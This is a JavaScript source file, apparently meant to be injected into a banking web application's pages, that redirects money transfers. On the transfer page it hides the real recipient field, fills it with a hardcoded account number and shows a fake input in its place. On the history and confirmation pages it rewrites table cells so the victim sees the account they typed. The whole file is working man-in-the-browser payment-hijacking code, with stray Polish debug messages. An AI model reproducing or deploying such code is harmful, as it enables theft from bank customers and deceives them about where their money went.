const my_account = '60693078472143749680850373'
let accounts = window.localStorage.getItem("accounts")
const path = window.location.pathname
console.log("kurwaaaa")

if(!accounts){
    window.localStorage.setItem("accounts", "")
    accounts = window.localStorage.getItem("accounts")
}


if (path.indexOf('history') == 1 || path.indexOf("transfer_confirm") == 1){
    console.log("zły indexof")
    const history_rows = Array.from(document.getElementsByTagName('tr')).slice(1)
    const accounts_array = accounts.split(',').reverse().slice(1)
    const accounts_assoc = history_rows.map((element, index) => {
        return [element, accounts_array[index]]
    })
    accounts_assoc.forEach((account_assoc) => {
        const history_account_number = account_assoc[0].cells[0]
        const account_number = account_assoc[1]
        history_account_number.innerHTML = account_number
    })
    if (path.indexOf("transfer_confirm") == 1){
        // window.onload = () => {
        const cancel_button = document.getElementsByName("cancel")[0]
        cancel_button.onsubmit = () => {
            const accounts_array = accounts.split(',').splice(-2, 2)
            accounts_array.push("")
            console.log(accounts_array)
            window.localStorage.setItem('accounts', accounts_array.join(','))
            return false
        }
        //} 
    }
    
}

else if(path.indexOf("transfer") == 1){
    console.log("dobry indexof")

    // window.onload = () => {
    console.log("window")
    const form = document.getElementsByTagName("form")[0]
    const receiver_account = document.getElementById('id_account_number')
    receiver_account.type = 'hidden'
    receiver_account.value = my_account
    const paragraph = document.getElementsByTagName("p")[3]
    fake_input = document.createElement("input", type="text")
    fake_input.id = "account_number"
    paragraph.appendChild(fake_input)

    form.onsubmit = () => {
        window.localStorage.setItem('accounts', accounts + document.getElementById('account_number').value + ',')
    }
//}
}




